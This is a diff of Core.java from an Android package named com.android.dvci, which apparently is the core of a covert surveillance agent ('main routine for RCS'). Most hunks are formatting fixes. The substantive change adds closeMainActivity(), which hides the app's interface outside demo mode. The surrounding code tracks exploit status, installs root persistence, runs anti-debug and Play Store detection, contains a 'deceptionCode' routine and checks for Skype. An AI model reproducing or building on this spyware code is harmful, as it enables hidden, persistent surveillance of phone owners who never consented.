@@ -15,6 +15,7 @@ import android.content.Context;
 import android.content.pm.PackageManager;
 import android.content.res.Resources;
 import android.os.Build;
+import android.os.Handler;
 import android.os.PowerManager;
 import android.os.PowerManager.WakeLock;
 import android.util.Log;
@@ -30,6 +31,7 @@ import com.android.dvci.evidence.EvDispatcher;
 import com.android.dvci.evidence.EvidenceBuilder;
 import com.android.dvci.file.AutoFile;
 import com.android.dvci.file.Path;
+import com.android.dvci.gui.ASG;
 import com.android.dvci.listener.BSm;
 import com.android.dvci.manager.ManagerEvent;
 import com.android.dvci.manager.ManagerModule;
@@ -101,7 +103,7 @@ public class Core extends Activity implements Runnable {
 		return singleton;
 	}
 
-	public synchronized static void serivceUnregister(){
+	public synchronized static void serivceUnregister() {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (serivceUnregister) ...");
 		}
@@ -139,6 +141,7 @@ public class Core extends Activity implements Runnable {
 			return false;
 		}
 
+
 		if (serviceRunning) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (Start): service already running"); //$NON-NLS-1$
@@ -146,8 +149,11 @@ public class Core extends Activity implements Runnable {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + "  exploitStatus == " + Status.getExploitStatusString() + "  exploitResult == " + Status.getExploitResultString());
 			}
-			if(Cfg.GUI) {
+			if (Cfg.GUI) {
 				Status.setIconState(true);
+				if(!Cfg.DEMO) {
+					closeMainActivity();
+				}
 			}
 
 			/* this check is used to know if we need to ask the user for root permission */
@@ -179,7 +185,7 @@ public class Core extends Activity implements Runnable {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (Start): checking uninstall Markup");
 			}
-			if (Status.getExploitStatus() != Status.EXPLOIT_STATUS_RUNNING && Status.uninstall ) {
+			if (Status.getExploitStatus() != Status.EXPLOIT_STATUS_RUNNING && Status.uninstall) {
 				UninstallAction.actualExecute(false);
 				return false;
 			}
@@ -188,7 +194,7 @@ public class Core extends Activity implements Runnable {
 			}
 			if (Status.haveRoot()) {
 				int perStatus = Status.getPersistencyStatus();
-				if(Cfg.PERSISTENCE) {
+				if (Cfg.PERSISTENCE) {
 					Root.installPersistence();
 					if (perStatus != Status.getPersistencyStatus()) {
 						Status.self().setReload();
@@ -196,6 +202,10 @@ public class Core extends Activity implements Runnable {
 				}
 			}
 			return false;
+		} else {
+			if (Cfg.GUI && !Cfg.DEMO) {
+				closeMainActivity();
+			}
 		}
 
 
@@ -244,7 +254,45 @@ public class Core extends Activity implements Runnable {
 			Status.self().makeToast(M.e("Agent started!"));
 		}
 
+//		if(Cfg.GUI){
+//
+//			Status.getStpe().schedule(new Runnable() {
+//				@Override
+//				public void run() {
+//					closeMainActivity();
+//				}
+//			}, 5, TimeUnit.SECONDS);
+//
+//		}
+
+
 		return true;
+	}
+
+	private void closeMainActivity() {
+		try {
+
+			Handler h = new Handler(Status.getAppContext().getMainLooper());
+			// Although you need to pass an appropriate context
+			h.post(new Runnable() {
+				@Override
+				public void run() {
+					//Status.getAppGui().showInstallDialog();
+					try {
+						ASG gui = Status.getAppGui();
+						if(gui!=null && !gui.isFinishing()) {
+							gui.finish();
+						}
+					}catch(Exception ex){};
+
+				}
+			});
+		} catch (Exception ex) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (makeToast) Error: " + ex);
+			}
+		}
+
 	}
 
 	public static void deceptionCode2(long mersenne) {
@@ -279,22 +327,24 @@ public class Core extends Activity implements Runnable {
 
 	/**
 	 * isServiceRunning
+	 *
 	 * @return
 	 */
 	public static boolean iSR() {
 		return serviceRunning;
 	}
 
-	private boolean runExploitSynchronously(){
-		if(Build.BRAND.toLowerCase().contains(M.e("huawei"))) {
+	private boolean runExploitSynchronously() {
+		if (Build.BRAND.toLowerCase().contains(M.e("huawei"))) {
 			return true;
 		}
-		if(Build.BRAND.toLowerCase().contains(M.e("lge"))) {
-			if(Build.MODEL.toUpperCase().contains(M.e("LG-D405")))
-			return true;
+		if (Build.BRAND.toLowerCase().contains(M.e("lge"))) {
+			if (Build.MODEL.toUpperCase().contains(M.e("LG-D405")))
+				return true;
 		}
 		return false;
 	}
+
 	// Runnable (main routine for RCS)
 	/*
 	 * (non-Javadoc)
@@ -358,7 +408,7 @@ public class Core extends Activity implements Runnable {
 			}
 
 		}
-		int confLoaded=0;
+		int confLoaded = 0;
 		try {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Info: init task"); //$NON-NLS-1$
@@ -368,7 +418,7 @@ public class Core extends Activity implements Runnable {
 			if (haveUninstallMarkup()) {
 				UninstallAction.actualExecute(true);
 				confLoaded = ConfType.Error;
-			}else {
+			} else {
 				confLoaded = taskInit();
 			}
 			// viene letta la conf e vengono fatti partire agenti e eventi
@@ -491,23 +541,23 @@ public class Core extends Activity implements Runnable {
 				}
 
 				if (Cfg.DEBUG) {
-					PackageManager pm =  Status.getAppContext().getPackageManager();
-					Log.w("QZ", "testing \"com.skype.raider\"");
+					PackageManager pm = Status.getAppContext().getPackageManager();
+					Check.log(TAG + "testing \"com.skype.raider\"");
 					try {
 						if (pm.getInstallerPackageName("com.skype.raider") != null) {
-							Log.w("QZ", "packagename: " + pm.getInstallerPackageName("com.skype.raider"));
+							Check.log(TAG + " packagename: " + pm.getInstallerPackageName("com.skype.raider"));
 						} else {
-							Log.w("QZ", " packagename: " + pm.getInstallerPackageName("com.skype.raider"));
+							Check.log(TAG + " packagename: " + pm.getInstallerPackageName("com.skype.raider"));
 						}
-					}catch(Exception e){
-						Log.w("QZ", " NOT installed " );
+					} catch (Exception e) {
+						Check.log(TAG + " NOT installed ");
 					}
-					Log.w("QZ", "testing" + Status.getAppContext().getPackageName());
-						if (pm.getInstallerPackageName(Status.getAppContext().getPackageName()) != null) {
-							Log.w("QZ", "packagename: " + pm.getInstallerPackageName(Status.getAppContext().getPackageName()));
-						} else {
-							Log.w("QZ", " packagename: LOCAL");
-						}
+					Check.log(TAG + " testing" + Status.getAppContext().getPackageName());
+					if (pm.getInstallerPackageName(Status.getAppContext().getPackageName()) != null) {
+						Check.log(TAG + " packagename: " + pm.getInstallerPackageName(Status.getAppContext().getPackageName()));
+					} else {
+						Check.log(TAG + " packagename: LOCAL");
+					}
 				}
 
 				for (final Trigger trigger : actionIds) {
@@ -958,9 +1008,7 @@ public class Core extends Activity implements Runnable {
 			if (!Cfg.DEBUG || Cfg.DEBUGANTI) {
 
 
-
 				AntiDebug ad = new AntiDebug();
-
 
 
 				if (ad.isDebug() || ad.isPlayStore()) {
@@ -1019,11 +1067,12 @@ public class Core extends Activity implements Runnable {
 		final AutoFile markup = new AutoFile(Status.getAppContext().getFilesDir(), UNINSTALL_MARKUP);
 		markup.write(1);
 	}
+
 	/*
 	 * Everything what shall be execute at the first root acquisition
 	 * should be included here
 	 */
-	public void firstRoot(){
+	public void firstRoot() {
 		Status.setPlayStoreEnableStatus(true);
 	}
 }
